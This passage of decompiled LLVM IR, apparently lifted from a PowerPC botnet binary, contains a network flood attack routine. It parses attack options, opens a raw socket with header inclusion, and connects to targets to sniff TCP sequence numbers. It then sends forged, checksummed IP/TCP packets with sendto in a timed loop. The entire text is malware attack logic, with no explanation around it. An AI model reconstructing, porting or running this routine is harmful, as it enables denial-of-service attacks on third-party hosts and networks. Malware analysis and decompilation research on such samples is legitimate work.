  %v5_10003240 = trunc i32 %v5_10003230 to i8
  %v0_10003248 = load i32, i32* @r28, align 4
  %v0_1000324c = load i32, i32* @r29, align 4
  store i32 %v0_1000324c, i32* %r3.global-to-local, align 4
  store i32 268448340, i32* @lr, align 4
  %v4_10003250 = inttoptr i32 %v0_10003248 to i32*
  %v5_10003250 = call i32 @attack_get_opt_int(i32 %v0_1000324c, i32* %v4_10003250, i32 3, i32 65535)
  %v0_10003254 = load i32, i32* @r28, align 4
  store i32 %v5_10003250, i32* %r26.global-to-local, align 4
  %v0_10003264 = load i32, i32* @r29, align 4
  store i32 %v0_10003264, i32* %r3.global-to-local, align 4
  store i32 268448364, i32* @lr, align 4
  %v4_10003268 = inttoptr i32 %v0_10003254 to i32*
  %v5_10003268 = call i32 @attack_get_opt_int(i32 %v0_10003264, i32* %v4_10003268, i32 4, i32 64)
  %v0_1000326c = load i32, i32* @r28, align 4
  %v0_10003280 = load i32, i32* @r29, align 4
  store i32 %v0_10003280, i32* %r3.global-to-local, align 4
  store i32 268448392, i32* @lr, align 4
  %v4_10003284 = inttoptr i32 %v0_1000326c to i32*
  %v5_10003284 = call i32 @attack_get_opt_int(i32 %v0_10003280, i32* %v4_10003284, i32 5, i32 1)
  %v0_10003290 = load i32, i32* @r28, align 4
  %v1_10003298 = urem i32 %v5_10003284, 256
  store i32 %v1_10003298, i32* %r30.global-to-local, align 4
  %v0_1000329c = load i32, i32* @r29, align 4
  store i32 %v0_1000329c, i32* %r3.global-to-local, align 4
  store i32 268448420, i32* @lr, align 4
  %v4_100032a0 = inttoptr i32 %v0_10003290 to i32*
  %v5_100032a0 = call i32 @attack_get_opt_int(i32 %v0_1000329c, i32* %v4_100032a0, i32 7, i32 65535)
  %v0_100032a4 = load i32, i32* @r28, align 4
  %v1_100032b0 = urem i32 %v5_100032a0, 65536
  store i32 %v1_100032b0, i32* @r25, align 4
  %v0_100032b4 = load i32, i32* @r29, align 4
  store i32 %v0_100032b4, i32* %r3.global-to-local, align 4
  store i32 268448444, i32* @lr, align 4
  %v4_100032b8 = inttoptr i32 %v0_100032a4 to i32*
  %v5_100032b8 = call i32 @attack_get_opt_int(i32 %v0_100032b4, i32* %v4_100032b8, i32 10, i32 0)
  %v0_100032bc = load i32, i32* @r28, align 4
  %v1_100032c0 = urem i32 %v5_100032b8, 256
  %v0_100032d0 = load i32, i32* @r29, align 4
  store i32 %v0_100032d0, i32* %r3.global-to-local, align 4
  store i32 268448472, i32* @lr, align 4
  %v4_100032d4 = inttoptr i32 %v0_100032bc to i32*
  %v5_100032d4 = call i32 @attack_get_opt_int(i32 %v0_100032d0, i32* %v4_100032d4, i32 11, i32 1)
  %v0_100032d8 = load i32, i32* @r28, align 4
  %v1_100032dc = urem i32 %v5_100032d4, 256
  %v0_100032ec = load i32, i32* @r29, align 4
  store i32 %v0_100032ec, i32* %r3.global-to-local, align 4
  store i32 268448500, i32* @lr, align 4
  %v4_100032f0 = inttoptr i32 %v0_100032d8 to i32*
  %v5_100032f0 = call i32 @attack_get_opt_int(i32 %v0_100032ec, i32* %v4_100032f0, i32 12, i32 1)
  %v0_100032f4 = load i32, i32* @r28, align 4
  %v1_100032f8 = urem i32 %v5_100032f0, 256
  %v0_10003308 = load i32, i32* @r29, align 4
  store i32 %v0_10003308, i32* %r3.global-to-local, align 4
  store i32 268448528, i32* @lr, align 4
  %v4_1000330c = inttoptr i32 %v0_100032f4 to i32*
  %v5_1000330c = call i32 @attack_get_opt_int(i32 %v0_10003308, i32* %v4_1000330c, i32 13, i32 0)
  %v0_10003310 = load i32, i32* @r28, align 4
  %v1_1000331c = urem i32 %v5_1000330c, 256
  %v0_10003320 = load i32, i32* @r29, align 4
  store i32 %v0_10003320, i32* %r3.global-to-local, align 4
  store i32 268448552, i32* @lr, align 4
  %v4_10003324 = inttoptr i32 %v0_10003310 to i32*
  %v5_10003324 = call i32 @attack_get_opt_int(i32 %v0_10003320, i32* %v4_10003324, i32 14, i32 0)
  %v0_10003328 = load i32, i32* @r28, align 4
  %v1_10003334 = urem i32 %v5_10003324, 256
  %v0_10003338 = load i32, i32* @r29, align 4
  store i32 %v0_10003338, i32* %r3.global-to-local, align 4
  store i32 268448576, i32* @lr, align 4
  %v4_1000333c = inttoptr i32 %v0_10003328 to i32*
  %v5_1000333c = call i32 @attack_get_opt_int(i32 %v0_10003338, i32* %v4_1000333c, i32 15, i32 0)
  %v0_10003348 = load i32, i32* @r28, align 4
  %v1_1000334c = urem i32 %v5_1000333c, 256
  %v0_10003350 = load i32, i32* @r29, align 4
  store i32 %v0_10003350, i32* %r3.global-to-local, align 4
  store i32 268448600, i32* @lr, align 4
  %v4_10003354 = inttoptr i32 %v0_10003348 to i32*
  %v5_10003354 = call i32 @attack_get_opt_int(i32 %v0_10003350, i32* %v4_10003354, i32 0, i32 768)
  %v0_10003358 = load i32, i32* @r28, align 4
  store i32 %v5_10003354, i32* @r22, align 4
  %v0_10003368 = load i32, i32* @r29, align 4
  store i32 %v0_10003368, i32* %r3.global-to-local, align 4
  store i32 268448624, i32* @lr, align 4
  %v4_1000336c = inttoptr i32 %v0_10003358 to i32*
  %v5_1000336c = call i32 @attack_get_opt_int(i32 %v0_10003368, i32* %v4_1000336c, i32 1, i32 1)
  %v1_10003370 = urem i32 %v5_1000336c, 256
  store i32 %v1_10003370, i32* %r17.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003378 = call i32 @__GI_time()
  %v1_10003380 = load i32, i32* @r27, align 4
  %v2_10003380 = add i32 %v1_10003380, %v0_10003378
  store i32 %v2_10003380, i32* %r18.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268448656, i32* @lr, align 4
  %v3_1000338c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v3_1000338c, i32* %r3.global-to-local, align 4
  %v3_10003390 = icmp eq i32 %v3_1000338c, -1
  store i32 %v3_1000338c, i32* @r31, align 4
  br i1 %v3_10003390, label %dec_label_pc_1000361c, label %dec_label_pc_1000339c

dec_label_pc_1000339c:                            ; preds = %entry
  store i32 1, i32* %r0.global-to-local, align 4
  %v2_100033a8 = ptrtoint i32* %stack_var_-424 to i32
  store i32 4, i32* %r7.global-to-local, align 4
  store i32 1, i32* %stack_var_-424, align 4
  store i32 268448696, i32* @lr, align 4
  %v5_100033b4 = call i32 @__GI_setsockopt(i32 0, i32 3, i32 %v2_100033a8, i32 4, i32 4)
  store i32 %v5_100033b4, i32* %r3.global-to-local, align 4
  %v3_100033b8 = icmp eq i32 %v5_100033b4, -1
  br i1 %v3_100033b8, label %dec_label_pc_100036d0, label %dec_label_pc_100033c0

dec_label_pc_100033c0:                            ; preds = %dec_label_pc_1000339c
  %v0_100033c0 = load i32, i32* @r21, align 4
  %v3_100033c0 = icmp eq i32 %v0_100033c0, 0
  store i1 %v3_100033c0, i1* %cr2_eq.global-to-local, align 1
  %v0_100033c4 = load i32, i32* %r26.global-to-local, align 4
  %v1_100033c4 = urem i32 %v0_100033c4, 65536
  store i32 %v1_100033c4, i32* %r26.global-to-local, align 4
  %v0_100033c8 = load i32, i32* @r24, align 4
  store i32 %v0_100033c8, i32* %stack_var_-424, align 4
  %v5_100033cc = trunc i32 %v0_100033c4 to i16
  br i1 %v3_100033c0, label %dec_label_pc_100033c0.dec_label_pc_10003530_crit_edge, label %dec_label_pc_100033d4

dec_label_pc_100033c0.dec_label_pc_10003530_crit_edge: ; preds = %dec_label_pc_100033c0
  %.pre = sext i16 %v5_100033cc to i32
  br label %dec_label_pc_10003530

dec_label_pc_100033d4:                            ; preds = %dec_label_pc_100033c0
  %v0_100033d8 = load i32, i32* %r30.global-to-local, align 4
  %v3_100033d8 = icmp eq i32 %v0_100033d8, 0
  store i1 %v3_100033d8, i1* %cr3_eq.global-to-local, align 1
  %v2_100033e0 = ptrtoint i32* %stack_var_-416 to i32
  %v0_100033e4 = load i32, i32* @r25, align 4
  %v4_100033e4 = icmp eq i32 %v0_100033e4, 65535
  store i1 %v4_100033e4, i1* %cr4_eq.global-to-local, align 1
  %v0_100033e8 = load i32, i32* @r22, align 4
  %v1_100033e8 = add i32 %v0_100033e8, 40
  store i32 %v1_100033e8, i32* %r0.global-to-local, align 4
  %v5_100033ec = trunc i32 %v1_100033e8 to i16
  %v2_100033f0 = ptrtoint i32* %stack_var_-400 to i32
  store i32 %v2_100033f0, i32* %r30.global-to-local, align 4
  %v2_100033f4 = ptrtoint i32* %stack_var_-384 to i32
  %v2_100033f8 = ptrtoint i32* %stack_var_-420 to i32
  store i32 %v2_100033f8, i32* %r26.global-to-local, align 4
  %v4_100034d8 = zext i16 %tmp9 to i32
  %v1_10003680 = and i32 %tmp8, 1179648
  %v4_10003774 = sext i16 %v5_100033cc to i32
  %sext = mul i32 %v5_10003268, 16777216
  %v4_10003788 = sdiv i32 %sext, 16777216
  %v1_10003684 = and i32 %tmp8, 327680
  %v3_10003684 = icmp eq i32 %v1_10003684, 0
  %v4_1000368c = icmp eq i32 %v1_10003680, 1179648
  br label %dec_label_pc_100033fc

dec_label_pc_100033fc:                            ; preds = %dec_label_pc_1000351c, %dec_label_pc_100033d4
  %stack_var_-120.0 = phi i32 [ %tmp, %dec_label_pc_100033d4 ], [ %stack_var_-120.1, %dec_label_pc_1000351c ]
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268448780, i32* @lr, align 4
  %v3_10003408 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_10003408, i32* %r3.global-to-local, align 4
  %v3_1000340c = icmp eq i32 %v3_10003408, -1
  store i32 %v3_10003408, i32* @r28, align 4
  br i1 %v3_1000340c, label %dec_label_pc_1000351c, label %dec_label_pc_10003418

dec_label_pc_10003418:                            ; preds = %dec_label_pc_100033fc, %dec_label_pc_100034f8
  store i32 3, i32* @r4, align 4
  store i32 0, i32* @r5, align 4
  store i32 268448808, i32* @lr, align 4
  %v1_10003424 = call i32 @__libc_fcntl(i32 3)
  store i32 4, i32* @r4, align 4
  %v1_1000342c = or i32 %v1_10003424, 2048
  store i32 %v1_1000342c, i32* @r5, align 4
  %v0_10003430 = load i32, i32* @r28, align 4
  store i32 %v0_10003430, i32* %r3.global-to-local, align 4
  store i32 268448828, i32* @lr, align 4
  %v2_10003438 = call i32 @__libc_fcntl(i32 %v0_10003430)
  store i32 %v2_10003438, i32* %r3.global-to-local, align 4
  %v3_1000343c = load i32, i32* %stack_var_-424, align 4
  store i32 2, i32* %r9.global-to-local, align 4
  %v1_10003444 = mul i32 %v3_1000343c, 24
  store i32 %v1_10003444, i32* %r0.global-to-local, align 4
  store i32 2, i32* %stack_var_-416, align 4
  %v1_1000344c = load i32, i32* @r23, align 4
  %v2_1000344c = add i32 %v1_1000344c, %v1_10003444
  store i32 %v2_1000344c, i32* %r11.global-to-local, align 4
  %v1_10003450 = add i32 %v2_1000344c, 20
  %v2_10003450 = inttoptr i32 %v1_10003450 to i8*
  %v3_10003450 = load i8, i8* %v2_10003450, align 1
  %v4_10003450 = zext i8 %v3_10003450 to i32
  store i32 %v4_10003450, i32* %r9.global-to-local, align 4
  %tmp47 = icmp ult i8 %v3_10003450, 32
  %v1_1000369c = add i32 %v2_1000344c, 16
  %v2_1000369c = inttoptr i32 %v1_1000369c to i32*
  %v3_1000369c = load i32, i32* %v2_1000369c, align 4
  br i1 %tmp47, label %dec_label_pc_1000369c, label %dec_label_pc_1000345c

dec_label_pc_1000345c:                            ; preds = %dec_label_pc_10003418
  store i32 %v3_1000369c, i32* %r0.global-to-local, align 4
  %v0_10003464 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003464, label %dec_label_pc_100036c4, label %dec_label_pc_10003468

dec_label_pc_10003468:                            ; preds = %dec_label_pc_1000369c, %dec_label_pc_1000345c
  %stack_var_-412.0 = phi i32 [ %v2_100036b8, %dec_label_pc_1000369c ], [ %v3_1000369c, %dec_label_pc_1000345c ]
  %v0_10003468 = load i32, i32* @r25, align 4
  %v1_10003468 = trunc i32 %v0_10003468 to i16
  br label %dec_label_pc_1000346c

dec_label_pc_1000346c:                            ; preds = %dec_label_pc_100036c4, %dec_label_pc_10003468
  %stack_var_-412.1 = phi i32 [ %stack_var_-412.2, %dec_label_pc_100036c4 ], [ %stack_var_-412.0, %dec_label_pc_10003468 ]
  %storemerge = phi i16 [ %v1_100036c4, %dec_label_pc_100036c4 ], [ %v1_10003468, %dec_label_pc_10003468 ]
  %v0_10003474 = load i32, i32* @r28, align 4
  store i32 %v0_10003474, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000347c.79 to i32), i32* @lr, align 4
  %v3_10003478 = call i32 @__libc_connect(i32 %v0_10003474, i32 %v2_100033e0, i32 16)
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003480 = call i32 @__GI_time()
  store i32 %v0_10003480, i32* %r3.global-to-local, align 4
  store i32 %v0_10003480, i32* %r29.global-to-local, align 4
  %v4_100034d4 = zext i16 %storemerge to i32
  %v4_100034e0 = icmp eq i16 %tmp9, %storemerge
  %v4_100034c8.not = icmp ne i32 %tmp10, %stack_var_-412.1
  br label %dec_label_pc_10003488

dec_label_pc_10003488:                            ; preds = %dec_label_pc_100034e8, %dec_label_pc_1000346c
  store i32 16, i32* %r0.global-to-local, align 4
  store i32 %v2_100033f0, i32* %r7.global-to-local, align 4
  store i32 %v2_100033f8, i32* %r8.global-to-local, align 4
  %v0_100034a0 = load i32, i32* @r31, align 4
  store i32 %v0_100034a0, i32* %r3.global-to-local, align 4
  store i32 16, i32* %stack_var_-420, align 4
  store i32 268448940, i32* @lr, align 4
  %v6_100034a8 = call i32 @__libc_recvfrom(i32 %v0_100034a0, i32 %v2_100033f4, i32 256, i32 16384, i32 %v2_100033f0, i32 %v2_100033f8)
  store i32 %v6_100034a8, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_100034b4 = icmp eq i32 %v6_100034a8, -1
  br i1 %v3_100034b4, label %dec_label_pc_1000361c, label %dec_label_pc_100034c0

dec_label_pc_100034c0:                            ; preds = %dec_label_pc_10003488
  store i32 %tmp10, i32* %r10.global-to-local, align 4
  store i32 %stack_var_-412.1, i32* %r0.global-to-local, align 4
  %tmp48 = icmp ult i32 %v6_100034a8, 41
  %or.cond = or i1 %tmp48, %v4_100034c8.not
  br i1 %or.cond, label %dec_label_pc_100034e8, label %dec_label_pc_100034d4

dec_label_pc_100034d4:                            ; preds = %dec_label_pc_100034c0
  store i32 %v4_100034d4, i32* @r8, align 4
  store i32 %v4_100034d8, i32* %r0.global-to-local, align 4
  store i32 %v4_100034d4, i32* %r9.global-to-local, align 4
  br i1 %v4_100034e0, label %dec_label_pc_1000367c, label %dec_label_pc_100034e8

dec_label_pc_100034e8:                            ; preds = %dec_label_pc_100034c0, %dec_label_pc_10003694, %dec_label_pc_100034d4
  %v0_100034e8 = call i32 @__GI_time()
  %v0_100034ec = load i32, i32* @r29, align 4
  %v2_100034ec = sub i32 %v0_100034e8, %v0_100034ec
  store i32 %v2_100034ec, i32* %r3.global-to-local, align 4
  %tmp49 = icmp slt i32 %v2_100034ec, 11
  br i1 %tmp49, label %dec_label_pc_10003488, label %dec_label_pc_100034f8

dec_label_pc_100034f8:                            ; preds = %dec_label_pc_10003694, %dec_label_pc_100034e8
  %v0_100034f8 = load i32, i32* @r28, align 4
  store i32 %v0_100034f8, i32* @r3, align 4
  %v0_100034fc = call i32 @__GI___libc_close()
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268449040, i32* @lr, align 4
  %v3_1000350c = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_1000350c, i32* %r3.global-to-local, align 4
  %v3_10003510 = icmp eq i32 %v3_1000350c, -1
  store i32 %v3_1000350c, i32* @r28, align 4
  br i1 %v3_10003510, label %dec_label_pc_1000351c, label %dec_label_pc_10003418

dec_label_pc_1000351c:                            ; preds = %dec_label_pc_100034f8, %dec_label_pc_100033fc, %dec_label_pc_100037a4
  %stack_var_-120.1 = phi i32 [ %stack_var_-120.0, %dec_label_pc_100033fc ], [ %v0_10003794, %dec_label_pc_100037a4 ], [ %stack_var_-120.0, %dec_label_pc_100034f8 ]
  %v3_1000351c = load i32, i32* %stack_var_-424, align 4
  %v1_10003520 = add i32 %v3_1000351c, 1
  store i32 %v1_10003520, i32* %r9.global-to-local, align 4
  %v0_10003524 = load i32, i32* @r21, align 4
  %v3_10003524 = icmp sgt i32 %v0_10003524, %v1_10003520
  store i32 %v1_10003520, i32* %stack_var_-424, align 4
  br i1 %v3_10003524, label %dec_label_pc_100033fc, label %dec_label_pc_10003530

dec_label_pc_10003530:                            ; preds = %dec_label_pc_1000351c, %dec_label_pc_100033c0.dec_label_pc_10003530_crit_edge
  %v4_10003534.pre-phi = phi i32 [ %.pre, %dec_label_pc_100033c0.dec_label_pc_10003530_crit_edge ], [ %v4_10003774, %dec_label_pc_1000351c ]
  store i32 %v4_10003534.pre-phi, i32* %r9.global-to-local, align 4
  %v0_1000353c = load i32, i32* %r17.global-to-local, align 4
  %v3_1000353c = icmp eq i32 %v0_1000353c, 0
  store i1 %v3_1000353c, i1* %cr4_eq.global-to-local, align 1
  store i1 false, i1* %cr3_eq.global-to-local, align 1
  %v0_10003544 = load i32, i32* @r22, align 4
  %v1_10003544 = add i32 %v0_10003544, 20
  store i32 %v1_10003544, i32* %r0.global-to-local, align 4
  %v1_10003548 = urem i32 %v1_10003544, 65536
  store i32 %v1_10003548, i32* @r25, align 4
  store i32 %v1_10003544, i32* @r24, align 4
  %v1_10003550 = add i32 %v0_10003544, 40
  store i32 %v1_10003550, i32* @r26, align 4
  br label %dec_label_pc_10003554

dec_label_pc_10003554:                            ; preds = %dec_label_pc_1000360c, %dec_label_pc_10003530
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %stack_var_-424, align 4
  %v0_1000355c = load i1, i1* %cr2_eq.global-to-local, align 1
  br i1 %v0_1000355c, label %dec_label_pc_1000360c, label %dec_label_pc_10003560

dec_label_pc_10003560:                            ; preds = %dec_label_pc_10003554, %dec_label_pc_10003578
  %v0_10003560 = phi i32 [ %v1_100035fc, %dec_label_pc_10003578 ], [ 0, %dec_label_pc_10003554 ]
  %v1_10003560 = mul i32 %v0_10003560, 4
  store i32 %v1_10003560, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r30, align 4
  %v0_10003568 = load i32, i32* %r20.global-to-local, align 4
  %v2_10003568 = add i32 %v0_10003568, %v1_10003560
  %v3_10003568 = inttoptr i32 %v2_10003568 to i32*
  %v4_10003568 = load i32, i32* %v3_10003568, align 4
  store i32 %v4_10003568, i32* @r28, align 4
  %v1_1000356c = add i32 %v4_10003568, 20
  store i32 %v1_1000356c, i32* @r27, align 4
  %v0_10003570 = load i1, i1* %cr3_eq.global-to-local, align 1
  br i1 %v0_10003570, label %dec_label_pc_100036dc, label %dec_label_pc_10003574

dec_label_pc_10003574:                            ; preds = %dec_label_pc_10003560
  %v0_10003574 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_10003574, label %dec_label_pc_10003578, label %dec_label_pc_100036e8

dec_label_pc_10003578:                            ; preds = %dec_label_pc_10003574, %dec_label_pc_100036dc, %dec_label_pc_100036e8
  %v0_10003578 = load i32, i32* @r30, align 4
  %v1_10003578 = trunc i32 %v0_10003578 to i16
  %v2_10003578 = load i32, i32* @r28, align 4
  %v3_10003578 = add i32 %v2_10003578, 10
  %v4_10003578 = inttoptr i32 %v3_10003578 to i16*
  store i16 %v1_10003578, i16* %v4_10003578, align 2
  %v0_10003580 = load i32, i32* @r28, align 4
  store i32 %v0_10003580, i32* @r3, align 4
  %v2_10003584 = call i32 @checksum_generic(i32 %v0_10003580, i32 20)
  %v3_10003584 = trunc i32 %v2_10003584 to i16
  store i32 %v2_10003584, i32* %r3.global-to-local, align 4
  %v3_10003588 = load i32, i32* %stack_var_-424, align 4
  store i32 %v3_10003588, i32* %r9.global-to-local, align 4
  %v3_1000358c = load i32, i32* @r28, align 4
  %v4_1000358c = add i32 %v3_1000358c, 10
  %v5_1000358c = inttoptr i32 %v4_1000358c to i16*
  store i16 %v3_10003584, i16* %v5_1000358c, align 2
  %v0_10003590 = load i32, i32* @r27, align 4
  store i32 %v0_10003590, i32* @r4, align 4
  %v0_10003594 = load i32, i32* %r9.global-to-local, align 4
  %v1_10003594 = mul i32 %v0_10003594, 16
  store i32 %v1_10003594, i32* %r9.global-to-local, align 4
  %v0_10003598 = load i32, i32* @r30, align 4
  %v1_10003598 = trunc i32 %v0_10003598 to i16
  %v3_10003598 = add i32 %v0_10003590, 16
  %v4_10003598 = inttoptr i32 %v3_10003598 to i16*
  store i16 %v1_10003598, i16* %v4_10003598, align 2
  %v0_1000359c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000359c = load i32, i32* %r19.global-to-local, align 4
  %v2_1000359c = add i32 %v1_1000359c, %v0_1000359c
  store i32 %v2_1000359c, i32* %r9.global-to-local, align 4
  %v0_100035a0 = load i32, i32* @r25, align 4
  %v1_100035a4 = add i32 %v2_1000359c, 4
  %v2_100035a4 = inttoptr i32 %v1_100035a4 to i32*
  %v3_100035a4 = load i32, i32* %v2_100035a4, align 4
  store i32 %v3_100035a4, i32* %r11.global-to-local, align 4
  %v0_100035a8 = load i32, i32* @r24, align 4
  %v0_100035ac = load i32, i32* @r28, align 4
  store i32 %v0_100035ac, i32* %r3.global-to-local, align 4
  %v1_100035b0 = load i32, i32* @r27, align 4
  %v2_100035b0 = add i32 %v1_100035b0, 4
  %v3_100035b0 = inttoptr i32 %v2_100035b0 to i32*
  store i32 %v3_100035a4, i32* %v3_100035b0, align 4
  %v0_100035b4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100035b4 = add i32 %v0_100035b4, 1
  store i32 %v1_100035b4, i32* %r11.global-to-local, align 4
  %v1_100035b8 = load i32, i32* %r9.global-to-local, align 4
  %v2_100035b8 = add i32 %v1_100035b8, 4
  %v3_100035b8 = inttoptr i32 %v2_100035b8 to i32*
  store i32 %v1_100035b4, i32* %v3_100035b8, align 4
  %v0_100035bc = load i32, i32* %r9.global-to-local, align 4
  %v1_100035bc = add i32 %v0_100035bc, 8
  %v2_100035bc = inttoptr i32 %v1_100035bc to i32*
  %v3_100035bc = load i32, i32* %v2_100035bc, align 4
  store i32 %v3_100035bc, i32* %r0.global-to-local, align 4
  %v1_100035c0 = load i32, i32* @r27, align 4
  %v2_100035c0 = add i32 %v1_100035c0, 8
  %v3_100035c0 = inttoptr i32 %v2_100035c0 to i32*
  store i32 %v3_100035bc, i32* %v3_100035c0, align 4
  %v4_100035c4 = call i32 @checksum_tcpudp(i32 %v0_100035ac, i32 %v0_10003590, i32 %v0_100035a0, i32 %v0_100035a8)
  %v5_100035c4 = trunc i32 %v4_100035c4 to i16
  store i32 %v4_100035c4, i32* %r3.global-to-local, align 4
  %v3_100035c8 = load i32, i32* %stack_var_-424, align 4
  store i32 %v3_100035c8, i32* %r7.global-to-local, align 4
  %v0_100035cc = load i32, i32* @r27, align 4
  %v1_100035cc = add i32 %v0_100035cc, 2
  %v2_100035cc = inttoptr i32 %v1_100035cc to i16*
  %v3_100035cc = load i16, i16* %v2_100035cc, align 2
  %v4_100035cc = zext i16 %v3_100035cc to i32
  store i32 %v4_100035cc, i32* %r0.global-to-local, align 4
  %v0_100035d0 = load i32, i32* @r28, align 4
  %v1_100035d4 = mul i32 %v3_100035c8, 24
  store i32 %v1_100035d4, i32* %r7.global-to-local, align 4
  %v4_100035d8 = add i32 %v0_100035cc, 16
  %v5_100035d8 = inttoptr i32 %v4_100035d8 to i16*
  store i16 %v5_100035c4, i16* %v5_100035d8, align 2
  %v0_100035dc = load i32, i32* @r26, align 4
  %v0_100035e0 = load i32, i32* @r31, align 4
  store i32 %v0_100035e0, i32* %r3.global-to-local, align 4
  %v0_100035e4 = load i32, i32* %r7.global-to-local, align 4
  %v1_100035e4 = load i32, i32* @r23, align 4
  %v2_100035e4 = add i32 %v1_100035e4, %v0_100035e4
  store i32 %v2_100035e4, i32* %r7.global-to-local, align 4
  %v0_100035ec = load i32, i32* %r0.global-to-local, align 4
  %v1_100035ec = trunc i32 %v0_100035ec to i16
  %v3_100035ec = add i32 %v2_100035e4, 2
  %v4_100035ec = inttoptr i32 %v3_100035ec to i16*
  store i16 %v1_100035ec, i16* %v4_100035ec, align 2
  store i32 16, i32* %r8.global-to-local, align 4
  store i32 268449272, i32* @lr, align 4
  %v6_100035f4 = call i32 @__libc_sendto(i32 %v0_100035e0, i32 %v0_100035d0, i32 %v0_100035dc, i32 16384, i32 %v2_100035e4, i32 16)
  store i32 %v6_100035f4, i32* %r3.global-to-local, align 4
  %v3_100035f8 = load i32, i32* %stack_var_-424, align 4
  store i32 %v3_100035f8, i32* %r9.global-to-local, align 4
  %v1_100035fc = add i32 %v3_100035f8, 1
  store i32 %v1_100035fc, i32* %r0.global-to-local, align 4
  %v0_10003600 = load i32, i32* @r21, align 4
  %v3_10003600 = icmp sgt i32 %v0_10003600, %v1_100035fc
  store i32 %v1_100035fc, i32* %stack_var_-424, align 4
  br i1 %v3_10003600, label %dec_label_pc_10003560, label %dec_label_pc_1000360c

dec_label_pc_1000360c:                            ; preds = %dec_label_pc_10003578, %dec_label_pc_10003554
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10003610 = call i32 @__GI_time()
  store i32 %v0_10003610, i32* %r3.global-to-local, align 4
  %v0_10003614 = load i32, i32* %r18.global-to-local, align 4
  %v2_10003614 = icmp slt i32 %v0_10003614, %v0_10003610
  br i1 %v2_10003614, label %dec_label_pc_1000361c, label %dec_label_pc_10003554

dec_label_pc_1000361c:                            ; preds = %dec_label_pc_10003488, %dec_label_pc_1000360c, %entry, %dec_label_pc_100036d0
  store i32 %v0_100031b4, i32* %r0.global-to-local, align 4
  %v1_10003630 = call %0 @__asm_mtcrf(i32 56, i32 %v0_10003190)
  store i32 %v0_100031e8, i32* %r26.global-to-local, align 4
  store i32 %v0_100031f4, i32* %r29.global-to-local, align 4
  store i32 %v0_100031fc, i32* %r30.global-to-local, align 4
  %v0_10003678 = load i32, i32* %r3.global-to-local, align 4
  ret i32 %v0_10003678

dec_label_pc_1000367c:                            ; preds = %dec_label_pc_100034d4
  store i32 %tmp8, i32* %r9.global-to-local, align 4
  store i32 %v1_10003680, i32* %r11.global-to-local, align 4
  store i32 1179648, i32* %r0.global-to-local, align 4
  br i1 %v4_1000368c, label %dec_label_pc_10003704, label %dec_label_pc_10003694

dec_label_pc_10003694:                            ; preds = %dec_label_pc_1000367c
  br i1 %v3_10003684, label %dec_label_pc_100034e8, label %dec_label_pc_100034f8

dec_label_pc_1000369c:                            ; preds = %dec_label_pc_10003418
  store i32 %v3_1000369c, i32* %r29.global-to-local, align 4
  %v0_100036a0 = call i32 @rand_next()
  store i32 %v0_100036a0, i32* %r3.global-to-local, align 4
  %v3_100036a4 = load i32, i32* %stack_var_-424, align 4
  %v1_100036a8 = mul i32 %v3_100036a4, 24
  %v1_100036ac = load i32, i32* @r23, align 4
  %v2_100036ac = add i32 %v1_100036ac, %v1_100036a8
  store i32 %v2_100036ac, i32* %r9.global-to-local, align 4
  %v1_100036b0 = add i32 %v2_100036ac, 20
  %v2_100036b0 = inttoptr i32 %v1_100036b0 to i8*
  %v3_100036b0 = load i8, i8* %v2_100036b0, align 1
  %v4_100036b0 = zext i8 %v3_100036b0 to i32
  store i32 %v4_100036b0, i32* %r0.global-to-local, align 4
  %tmp51 = urem i8 %v3_100036b0, 64
  %v2_100036b4 = zext i8 %tmp51 to i32
  %v3_100036b4 = lshr i32 %v0_100036a0, %v2_100036b4
  %v1_100036b8 = load i32, i32* %r29.global-to-local, align 4
  %v2_100036b8 = add i32 %v3_100036b4, %v1_100036b8
  store i32 %v2_100036b8, i32* %r3.global-to-local, align 4
  %v0_100036c0 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100036c0, label %dec_label_pc_100036c4, label %dec_label_pc_10003468

dec_label_pc_100036c4:                            ; preds = %dec_label_pc_1000369c, %dec_label_pc_1000345c
  %stack_var_-412.2 = phi i32 [ %v2_100036b8, %dec_label_pc_1000369c ], [ %v3_1000369c, %dec_label_pc_1000345c ]
  %v0_100036c4 = call i32 @rand_next()
  %v1_100036c4 = trunc i32 %v0_100036c4 to i16
  store i32 %v0_100036c4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000346c

dec_label_pc_100036d0:                            ; preds = %dec_label_pc_1000339c
  %v0_100036d0 = load i32, i32* @r31, align 4
  store i32 %v0_100036d0, i32* @r3, align 4
  %v0_100036d4 = call i32 @__GI___libc_close()
  store i32 %v0_100036d4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000361c

dec_label_pc_100036dc:                            ; preds = %dec_label_pc_10003560
  %v0_100036dc = call i32 @rand_next()
  %v1_100036dc = trunc i32 %v0_100036dc to i16
  store i32 %v0_100036dc, i32* %r3.global-to-local, align 4
  %v3_100036e0 = load i32, i32* @r28, align 4
  %v4_100036e0 = add i32 %v3_100036e0, 4
  %v5_100036e0 = inttoptr i32 %v4_100036e0 to i16*
  store i16 %v1_100036dc, i16* %v5_100036e0, align 2
  %v0_100036e4 = load i1, i1* %cr4_eq.global-to-local, align 1
  br i1 %v0_100036e4, label %dec_label_pc_10003578, label %dec_label_pc_100036dc.dec_label_pc_100036e8_crit_edge

dec_label_pc_100036dc.dec_label_pc_100036e8_crit_edge: ; preds = %dec_label_pc_100036dc
  %v0_100036e8.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_100036e8

